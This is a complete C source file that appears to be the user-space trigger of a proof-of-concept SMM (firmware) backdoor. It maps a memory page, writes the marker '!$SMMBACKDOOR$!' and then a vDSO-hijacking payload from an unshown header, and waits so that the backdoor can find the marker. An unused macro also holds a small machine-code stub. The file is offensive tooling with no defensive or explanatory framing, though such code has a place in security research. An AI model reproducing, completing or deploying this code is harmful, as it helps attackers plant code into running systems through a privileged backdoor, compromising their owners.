#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>

#include "hijack_vdso.h"

#define PATTERN	"!$SMMBACKDOOR$!"
#define CODE	PATTERN "\xb8\x39\x05\x00\x00\xc3"

static void *p;


static void sigint(int dummy)
{
	dummy = dummy;

	printf("exiting\n");

	if (p != NULL)
		memset(p, 0, sizeof(PATTERN)-1);

	exit(EXIT_SUCCESS);
}

int main(void)
{
	unsigned char *q;

	if (signal(SIGINT, sigint) != 0)
		err(EXIT_FAILURE, "signal");

	p = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (p == MAP_FAILED)
		err(EXIT_FAILURE, "mmap");

	q = p;
	memcpy(q, PATTERN, sizeof(PATTERN)-1);
	q += sizeof(PATTERN)-1;

	memcpy(q, hijack_vdso_raw, hijack_vdso_raw_len);

	while (1)
		sleep(1);

	return EXIT_SUCCESS;
}
